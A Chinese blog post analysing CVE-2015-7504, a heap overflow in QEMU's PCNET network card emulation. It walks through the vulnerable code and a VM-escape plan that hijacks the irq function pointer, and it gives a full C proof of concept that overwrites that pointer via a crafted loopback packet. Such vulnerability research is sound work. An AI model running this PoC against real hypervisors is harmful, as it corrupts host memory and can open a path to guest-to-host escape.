<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>QEMU堆溢出漏洞----CVE-2015-7504 | hhdx's blog</title>
<meta name=keywords content="QEMU,CVE"><meta name=description content="CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE 标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。
PCNET网卡
AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。
网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12


            0                                  16
            +----------------------------------+
            |              EPROM               |
            +----------------------------------+
            |      RDP - Data reg for CSR      |
            +----------------------------------+
            | RAP - Index reg for CSR and BCR  |
            +----------------------------------+
            |           Reset reg              |
            +----------------------------------+
            |      BDP - Data reg for BCR      |
            +----------------------------------+


"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/cve-2015-7504/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/cve-2015-7504/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/cve-2015-7504/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="QEMU堆溢出漏洞----CVE-2015-7504"><meta property="og:description" content="CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE 标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。
PCNET网卡 AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。
网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。
1 2 3 4 5 6 7 8 9 10 11 12 0 16 +----------------------------------+ | EPROM | +----------------------------------+ | RDP - Data reg for CSR | +----------------------------------+ | RAP - Index reg for CSR and BCR | +----------------------------------+ | Reset reg | +----------------------------------+ | BDP - Data reg for BCR | +----------------------------------+ "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-12-12T10:36:40+00:00"><meta property="article:modified_time" content="2020-12-12T10:36:40+00:00"><meta property="article:tag" content="Qemu"><meta property="article:tag" content="CVE"><meta name=twitter:card content="summary"><meta name=twitter:title content="QEMU堆溢出漏洞----CVE-2015-7504"><meta name=twitter:description content="CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE 标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。
PCNET网卡
AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。
网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12


            0                                  16
            +----------------------------------+
            |              EPROM               |
            +----------------------------------+
            |      RDP - Data reg for CSR      |
            +----------------------------------+
            | RAP - Index reg for CSR and BCR  |
            +----------------------------------+
            |           Reset reg              |
            +----------------------------------+
            |      BDP - Data reg for BCR      |
            +----------------------------------+


"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"QEMU堆溢出漏洞----CVE-2015-7504","item":"https://hhdx.xyz/post/cve-2015-7504/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"QEMU堆溢出漏洞----CVE-2015-7504","name":"QEMU堆溢出漏洞----CVE-2015-7504","description":"CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE 标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。\nPCNET网卡 AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。\n网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。\n1 2 3 4 5 6 7 8 9 10 11 12 0 16 +----------------------------------+ | EPROM | +----------------------------------+ | RDP - Data reg for CSR | +----------------------------------+ | RAP - Index reg for CSR and BCR | +----------------------------------+ | Reset reg | +----------------------------------+ | BDP - Data reg for BCR | +----------------------------------+ ","keywords":["QEMU","CVE"],"articleBody":"CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE 标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。\nPCNET网卡 AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。\n网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。\n1 2 3 4 5 6 7 8 9 10 11 12 0 16 +----------------------------------+ | EPROM | +----------------------------------+ | RDP - Data reg for CSR | +----------------------------------+ | RAP - Index reg for CSR and BCR | +----------------------------------+ | Reset reg | +----------------------------------+ | BDP - Data reg for BCR | +----------------------------------+ 两种寄存器都需要通过设置对应的我们要访问的RAP（寄存器地址端口）寄存器来实现对相应CSR或BCR寄存器的访问。例如，如果想要初始化或者重启网卡，得设置CSR0的bit0和bit1为1，这个操作可以通过设置RAP为0，然后设置CSR为3来实现。\n1 2 outw(0x0, PCNET_PORT + RAP); outw(0x3, PCNET_PORT + RDP); 网卡的配置可以通过填充一个初始化结构体，并将该结构体的物理地址传送到网卡（通过设置CSR[1]和CSR[2]）来完成，结构体定义如下（通过查询qemu实现的PCNET的规范，发现这个pcnet_config对应的是32位IDAR的config）：\n1 2 3 4 5 6 7 8 9 10 struct pcnet_config { uint16_t mode; /* working mode: promiscusous, looptest, etc. */ uint8_t rlen; /* number of rx descriptors in log2 base */ uint8_t tlen; /* number of tx descriptors in log2 base */ uint8_t mac[6]; /* mac address */ uint16_t _reserved; uint8_t ladr[8]; /* logical address filter */ uint32_t rx_desc; /* physical address of rx descriptor buffer */ uint32_t tx_desc; /* physical address of tx descriptor buffer */ }; 漏洞分析 PCNET网卡在loopback测试模式中接收到大尺寸的数据包时，存在一个堆上的溢出漏洞。PCNET的仿真使用了4kB的缓冲区来存储数据包。如果接收描述符(Tx descriptor)存在ADDFCS标志，那么网卡将在数据包的尾部添加CRC校验码（见pcnet_receive()函数，hw/net/pcnet.c）。在接收小于4096-4字节的时候，不会出现任何问题，但如果这个数据包就是4096字节大小，那么将会在目标缓冲区溢出4个字节。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ssize_t pcnet_receive(NetClientState *nc, const uint8_t *buf, size_t size_) { // ....... if (!(CSR_CRST(s) \u0026 0x8000)) { #ifdef PCNET_DEBUG_RMD printf(\"pcnet - no buffer: RCVRC=%d\\n\", CSR_RCVRC(s)); #endif s-\u003ecsr[0] |= 0x1000; /* Set MISS flag */ CSR_MISSC(s)++; } else { uint8_t *src = s-\u003ebuffer; hwaddr crda = CSR_CRDA(s); struct pcnet_RMD rmd; int pktcount = 0; if (!s-\u003elooptest) { memcpy(src, buf, size); /* no need to compute the CRC */ src[size] = 0; src[size + 1] = 0; src[size + 2] = 0; src[size + 3] = 0; size += 4; } else if (s-\u003elooptest == PCNET_LOOPTEST_CRC || !CSR_DXMTFCS(s) || size \u003c MIN_BUF_SIZE+4) { uint32_t fcs = ~0; uint8_t *p = src; while (p != \u0026src[size]) CRC(fcs, *p++); *(uint32_t *)p = htonl(fcs); // bug here size += 4; } else { uint32_t fcs = ~0; uint8_t *p = src; while (p != \u0026src[size-4]) CRC(fcs, *p++); crc_err = (*(uint32_t *)p != htonl(fcs)); } // ....... } 在上面的代码中变量s指向PCNET的主要结构PCNetState_st，从它的结构来看（见下）。溢出会修改它的irq成员的低4字节，通过对CRC的逆向，可以完全控制溢出的4字节的内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 struct PCNetState_st { NICState *nic; NICConf conf; QEMUTimer *poll_timer; int rap, isr, lnkst; uint32_t rdra, tdra; uint8_t prom[16]; uint16_t csr[128]; uint16_t bcr[32]; int xmit_pos; uint64_t timer; MemoryRegion mmio; uint8_t buffer[4096]; // overflow here qemu_irq irq; void (*phys_mem_read)(void *dma_opaque, hwaddr addr, uint8_t *buf, int len, int do_bswap); void (*phys_mem_write)(void *dma_opaque, hwaddr addr, uint8_t *buf, int len, int do_bswap); void *dma_opaque; int tx_busy; int looptest; }; 这个irq成员变量指向一个IRQState结构的指针，该结构又含有函数指针。\n1 2 3 4 5 6 7 8 9 10 11 12 // include/hw/irq.h typedef struct IRQState *qemu_irq; typedef void (*qemu_irq_handler)(void *opaque, int n, int level); // hw/core/irq.c struct IRQState { Object parent_obj; qemu_irq_handler handler; void *opaque; int n; }; 这个函数将会被调用多次。例如，在pcnet_receive()函数的末尾，将会调用pcnet_update_irq()，其中会继续调用qemu_set_irq()：\n1 2 3 4 5 6 7 8 // hw/core/irq.c void qemu_set_irq(qemu_irq irq, int level) { if (!irq) return; irq-\u003ehandler(irq-\u003eopaque, irq-\u003en, level); } 利用的流程 构造一个IRQState结构，其中包含一个想要执行的函数的指针（如：system()） 计算构造的结构的准确地址。通过前述CVE-2015-5165泄露的基地址，可以达成这个目标。 伪造一个4kB的数据包。对CRC进行逆向，使其指向构造的IRQState结构 发送数据包 loopback接收之后：\n将收的数据包拷贝到缓冲区 计算数据包的CRC，添加到末尾，也就覆盖了irq变量的低4字节 调用pcnet_update_irq()函数，触发目标函数指针。 PoC Poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 #include #include #include #include #include #include #include #include #include // page relevant #define PAGE_SHIFT 12 #define PAGE_SIZE (1 \u003c\u003c PAGE_SHIFT) #define PFN_PRESENT (1ULL \u003c\u003c 63) #define PAGE_PFN ((1ULL \u003c\u003c 55) - 1) #define PAGE_MASK ((1 \u003c\u003c PAGE_SHIFT) - 1) #define PAGE_ALIGNED __attribute__((aligned(PAGE_SIZE))) #define PCNET_PORT 0xc140 #define PCNET_BUFFER_SIZE 4096 #define DRX 0x0001 #define DTX 0x0002 #define LOOP 0x0004 #define DXMTFCS 0x0008 #define INTL 0x0040 #define DRCVPA 0x2000 #define DRCVBC 0x4000 #define PROM 0x8000 enum pcnet_register { RDP = 0x10, RAP = 0x12, RST = 0x14, }; #define CRC(crc, ch) (crc = (crc \u003e\u003e 8) ^ crctab[(crc ^ (ch)) \u0026 0xff]) /* generated using the AUTODIN II polynomial *\tx^32 + x^26 + x^23 + x^22 + x^16 + *\tx^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1 */ static const uint32_t crctab[256] = { 0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d, }; struct pcnet_config32 { uint16_t mode; /* working mode: promiscusous, looptest, etc. */ uint8_t rlen; /* number of rx descriptors in log2 base */ uint8_t tlen; /* number of tx descriptors in log2 base */ uint8_t mac[6]; /* mac address */ uint16_t _reserved; uint8_t ladr[8]; /* logical address filter */ uint32_t rx_desc; /* physical address of rx descriptor buffer */ uint32_t tx_desc; /* physical address of tx descriptor buffer */ }; struct pcnet_desc { uint32_t addr; int16_t length; int8_t status_1; int8_t status_2; uint32_t misc; uint32_t _reserved; }; static uint8_t pcnet_packet[PCNET_BUFFER_SIZE] = { 0x52, 0x54, 0x00, 0x12, 0x34, 0x58, 0x52, 0x54, 0x00, 0x12, 0x34, 0x58, 0x08, 0x00, }; uint64_t gva_to_gpa(void *addr) { int fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd \u003c 0) { perror(\"open\"); exit(-1); } uint64_t pme, gfn; uint64_t offset; offset = ((uintptr_t)addr \u003e\u003e 9) \u0026 ~7; lseek(fd, offset, SEEK_SET); read(fd, \u0026pme, 8); printf(\"pme: 0x%llx\\n\", pme); if (!(pme \u0026 PFN_PRESENT)) { return -1; } gfn = pme \u0026 PAGE_PFN; close(fd); return (gfn \u003c\u003c PAGE_SHIFT) | ((uintptr_t)addr \u0026 PAGE_MASK); } /* int fd; uint32_t page_offset(uint32_t addr) { return addr \u0026 ((1 \u003c\u003c PAGE_SHIFT) - 1); } uint64_t gva_to_gfn(void *addr) { uint64_t pme, gfn; size_t offset; offset = ((uintptr_t)addr \u003e\u003e 9) \u0026 ~7; lseek(fd, offset, SEEK_SET); read(fd, \u0026pme, 8); if (!(pme \u0026 PFN_PRESENT)) return -1; gfn = pme \u0026 PAGE_PFN; return gfn; } uint64_t gva_to_gpa(void *addr) { uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn \u003c\u003c PAGE_SHIFT) | page_offset((uint64_t)addr); } */ void pcnet_desc_config(struct pcnet_desc *desc, void *buffer, int is_rx) { uint16_t bcnt = -PCNET_BUFFER_SIZE; bcnt \u0026= 0xfff; bcnt |= 0xf000; memset(desc, 0, sizeof(struct pcnet_desc)); memset(buffer, 0, PCNET_BUFFER_SIZE); desc-\u003eaddr = (uint32_t)gva_to_gpa(buffer); desc-\u003elength = bcnt; if (is_rx) { // receive buffers owned by the card desc-\u003estatus_2 = 0x80; } else { desc-\u003estatus_2 = 0x83; } } uint64_t pcnet_card_config(struct pcnet_config32 *config, struct pcnet_desc *tx_desc, struct pcnet_desc *rx_desc) { memset(config, 0, sizeof(struct pcnet_config32)); config-\u003emode = LOOP | PROM; config-\u003etx_desc = (uint32_t)gva_to_gpa(tx_desc); config-\u003erx_desc = (uint32_t)gva_to_gpa(rx_desc); return gva_to_gpa(config); } // PCNET primitives void pcnet_packet_patch_crc(uint8_t *packet, uint32_t current, uint32_t target) { size_t i = 0, j; uint8_t *ptr; uint32_t workspace[2] = { current, target }; for (i = 0; i \u003c 2; i++) workspace[i] \u0026= (uint32_t)~0; ptr = (uint8_t *)(workspace + 1); for (i = 0; i \u003c 4; i++) { j = 0; while(crctab[j] \u003e\u003e 24 != *(ptr + 3 - i)) j++; *((uint32_t *)(ptr - i)) ^= crctab[j]; *(ptr - i - 1) ^= j; } strncpy(packet, ptr - 4, 4); } void pcnet_packet_send(struct pcnet_desc *desc, void *buffer, void *packet, size_t len) { if (len \u003c= PCNET_BUFFER_SIZE) { memcpy(buffer, packet, len); desc-\u003estatus_2 |= 0x23; len = -len; len \u0026= 0xfff; len |= 0xf000; desc-\u003elength = len; // flip ownership to card desc-\u003estatus_2 |= 0x80; // send packet outw(0, PCNET_PORT + RAP); outw(8, PCNET_PORT + RDP); } } int main(int argc, char *argv[]) { // fd = open(\"/proc/self/pagemap\", O_RDONLY); struct pcnet_config32 pcnet_config; uint32_t pcnet_config_mem; uint32_t pcnet_tx_desc_mem; uint32_t pcnet_rx_desc_mem; struct pcnet_desc pcnet_tx_desc PAGE_ALIGNED; struct pcnet_desc pcnet_rx_desc PAGE_ALIGNED; uint64_t *pcnet_tx_buffer, *pcnet_rx_buffer; void *addr; uint32_t fcs = ~0; uint8_t *ptr; uint16_t lo, hi; iopl(3); addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE); pcnet_tx_buffer = (uint64_t *)addr; addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE); pcnet_rx_buffer = (uint64_t *)addr; pcnet_desc_config(\u0026pcnet_tx_desc, pcnet_tx_buffer, 0); pcnet_desc_config(\u0026pcnet_rx_desc, pcnet_rx_buffer, 1); pcnet_config_mem = (uint32_t)pcnet_card_config(\u0026pcnet_config, \u0026pcnet_tx_desc, \u0026pcnet_rx_desc); pcnet_tx_desc_mem = (uint32_t)gva_to_gpa(\u0026pcnet_tx_desc); pcnet_rx_desc_mem = (uint32_t)gva_to_gpa(\u0026pcnet_rx_desc); lo = (uint16_t)pcnet_config_mem; hi = (uint16_t)(pcnet_config_mem \u003e\u003e 16); // compute required crc ptr = pcnet_packet; while (ptr != \u0026pcnet_packet[PCNET_BUFFER_SIZE - 4]) { CRC(fcs, *ptr++); } pcnet_packet_patch_crc(ptr, fcs, htonl(0xdeadbeef)); // soft reset inw(PCNET_PORT + RST); // set software style outw(58, PCNET_PORT + RAP); outw(0x102, PCNET_PORT + RDP); // card config outw(1, PCNET_PORT + RAP); outw(lo, PCNET_PORT + RDP); outw(2, PCNET_PORT + RAP); outw(hi, PCNET_PORT + RDP); //CSR_DPOLL outw(4, PCNET_PORT + RAP); outw(0x1000, PCNET_PORT + RDP); // init and start outw(0, PCNET_PORT + RAP); outw(3, PCNET_PORT + RDP); //set CSR_SPND outw(5, PCNET_PORT + RAP); outw(0x1, PCNET_PORT + RDP); //CSR_PROM outw(15, PCNET_PORT + RAP); outw(0x8004, PCNET_PORT + RDP); //CSR_CRST outw(41, PCNET_PORT + RAP); outw(0x8000, PCNET_PORT + RDP); //clear CSR_SPND outw(5, PCNET_PORT + 0x12); outw(0, PCNET_PORT + 0x10); sleep(2); pcnet_packet_send(\u0026pcnet_tx_desc, pcnet_tx_buffer, pcnet_packet, PCNET_BUFFER_SIZE); return 0; } tips 下面这个命令可以查看设备与网卡的对应关系\n1 $ ls -l /sys/class/net 参考 VM escape QEMU Case Study qemu逃逸漏洞解析 Resery/Virtualized_Learning AMD PCNET osdev.org ","wordCount":"3316","inLanguage":"zh-cn","datePublished":"2020-12-12T10:36:40Z","dateModified":"2020-12-12T10:36:40Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/cve-2015-7504/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">QEMU堆溢出漏洞----CVE-2015-7504</h1><div class=post-meta><span title='2020-12-12 10:36:40 +0000 UTC'>December 12, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div 